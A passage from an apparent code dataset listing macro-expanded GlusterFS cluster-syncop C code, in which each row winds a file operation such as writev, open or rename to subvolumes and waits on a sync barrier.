        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->flush_cbk) tmp_cbk = cluster_flush_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->flush""; _new->unwind_to = ""cluster_flush_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->flush_cbk = cluster_flush_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->flush); subvols[__i]->fops->flush (_new, subvols[__i], fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                          ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->writev_cbk) tmp_cbk = cluster_writev_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->writev""; _new->unwind_to = ""cluster_writev_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->writev_cbk = cluster_writev_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->writev); subvols[__i]->fops->writev (_new, subvols[__i], fd, vector, count, off, flags, iobref, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                struct iobref *iobref, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->writev_cbk) tmp_cbk = cluster_writev_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->writev""; _new->unwind_to = ""cluster_writev_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->writev_cbk = cluster_writev_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->writev); subvols[__i]->fops->writev (_new, subvols[__i], fd, vector, count, off, flags, iobref, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                                             ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->readv_cbk) tmp_cbk = cluster_readv_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->readv""; _new->unwind_to = ""cluster_readv_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->readv_cbk = cluster_readv_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->readv); subvols[__i]->fops->readv (_new, subvols[__i], fd, size, offset, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"               off_t offset, uint32_t flags, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->readv_cbk) tmp_cbk = cluster_readv_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->readv""; _new->unwind_to = ""cluster_readv_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->readv_cbk = cluster_readv_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->readv); subvols[__i]->fops->readv (_new, subvols[__i], fd, size, offset, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                         ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->open_cbk) tmp_cbk = cluster_open_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->open""; _new->unwind_to = ""cluster_open_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->open_cbk = cluster_open_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->open); subvols[__i]->fops->open (_new, subvols[__i], loc, flags, fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"              fd_t *fd, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->open_cbk) tmp_cbk = cluster_open_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->open""; _new->unwind_to = ""cluster_open_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->open_cbk = cluster_open_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->open); subvols[__i]->fops->open (_new, subvols[__i], loc, flags, fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                     ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->create_cbk) tmp_cbk = cluster_create_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->create""; _new->unwind_to = ""cluster_create_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->create_cbk = cluster_create_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->create); subvols[__i]->fops->create (_new, subvols[__i], loc, flags, mode, umask, fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                mode_t mode, mode_t umask, fd_t *fd, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->create_cbk) tmp_cbk = cluster_create_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->create""; _new->unwind_to = ""cluster_create_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->create_cbk = cluster_create_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->create); subvols[__i]->fops->create (_new, subvols[__i], loc, flags, mode, umask, fd, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                                  ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->link_cbk) tmp_cbk = cluster_link_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->link""; _new->unwind_to = ""cluster_link_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->link_cbk = cluster_link_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->link); subvols[__i]->fops->link (_new, subvols[__i], oldloc, newloc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"              dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->link_cbk) tmp_cbk = cluster_link_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->link""; _new->unwind_to = ""cluster_link_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->link_cbk = cluster_link_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->link); subvols[__i]->fops->link (_new, subvols[__i], oldloc, newloc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                  ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->rename_cbk) tmp_cbk = cluster_rename_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->rename""; _new->unwind_to = ""cluster_rename_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->rename_cbk = cluster_rename_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->rename); subvols[__i]->fops->rename (_new, subvols[__i], oldloc, newloc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                loc_t *newloc, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->rename_cbk) tmp_cbk = cluster_rename_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->rename""; _new->unwind_to = ""cluster_rename_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->rename_cbk = cluster_rename_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->rename); subvols[__i]->fops->rename (_new, subvols[__i], oldloc, newloc, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                  ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->symlink_cbk) tmp_cbk = cluster_symlink_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->symlink""; _new->unwind_to = ""cluster_symlink_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->symlink_cbk = cluster_symlink_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->symlink); subvols[__i]->fops->symlink (_new, subvols[__i], linkpath, loc, umask, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                 loc_t *loc, mode_t umask, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->symlink_cbk) tmp_cbk = cluster_symlink_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->symlink""; _new->unwind_to = ""cluster_symlink_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->symlink_cbk = cluster_symlink_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->symlink); subvols[__i]->fops->symlink (_new, subvols[__i], linkpath, loc, umask, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                                ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->rmdir_cbk) tmp_cbk = cluster_rmdir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->rmdir""; _new->unwind_to = ""cluster_rmdir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->rmdir_cbk = cluster_rmdir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->rmdir); subvols[__i]->fops->rmdir (_new, subvols[__i], loc, flags, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"               dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->rmdir_cbk) tmp_cbk = cluster_rmdir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->rmdir""; _new->unwind_to = ""cluster_rmdir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->rmdir_cbk 